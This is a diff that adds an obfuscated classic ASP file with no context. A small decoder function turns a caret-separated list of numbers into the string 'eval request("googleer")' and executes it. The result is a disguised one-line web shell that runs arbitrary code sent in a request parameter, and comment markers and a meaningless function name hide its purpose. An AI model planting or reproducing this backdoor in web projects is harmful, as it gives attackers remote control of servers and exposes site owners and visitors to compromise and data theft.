@@ -1,0 +1,11 @@
+<%
+<!--
+Function KQWG(YMER):
+	YMER = Split(YMER,"^")
+	For x=0 To Ubound(YMER)
+		KQWG=KQWG&Chr(YMER(x)-206)
+	Next
+End Function
+EXecutE(KQWG("307^324^303^314^238^320^307^319^323^307^321^322^246^240^309^317^317^309^314^307^307^320^240^247"))
+-->
+%>
